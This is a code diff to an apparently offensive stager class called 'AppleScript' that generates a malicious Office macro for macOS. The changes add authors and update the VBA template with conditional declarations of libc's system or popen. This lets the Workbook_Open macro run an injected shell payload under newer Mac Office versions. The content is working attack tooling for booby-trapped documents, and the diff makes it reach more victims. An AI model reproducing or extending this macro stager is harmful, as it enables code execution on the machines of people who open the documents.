@@ -8,9 +8,9 @@ class Stager:
         self.info = {
             'Name': 'AppleScript',
 
-            'Author': ['@harmj0y'],
+            'Author': ['@harmj0y', '@dchrastil', '@import-au'],
 
-            'Description': ('An OSX office macro.'),
+            'Description': ('An OSX office macro that supports newer versions of Office.'),
 
             'Comments': [
                 "http://stackoverflow.com/questions/6136798/vba-shell-function-in-office-2011-for-mac"
@@ -91,7 +91,15 @@ class Stager:
                 payload = formStr("cmd", match)
 
             macro = """
-Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
+#If MAC_OFFICE_VERSION >= 15.33 Then
+    Private Declare Function system Lib "libc.dylib" Alias "popen" (ByVal command As String) As LongPtr
+#Else
+    #If VBA7 Then
+        Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
+    #Else
+        Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
+    #EndIf
+#EndIf
 
 Private Sub Workbook_Open()
     Dim result As Long
